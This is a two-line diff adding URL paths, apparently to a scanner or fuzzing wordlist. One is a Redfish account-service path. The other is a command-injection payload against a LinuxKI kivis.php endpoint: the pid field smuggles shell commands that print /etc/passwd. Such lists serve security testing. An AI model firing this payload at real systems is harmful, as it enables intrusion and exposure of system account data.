@@ -1,0 +1,2 @@
+/rest/v1/AccountService/Accounts
+/linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;
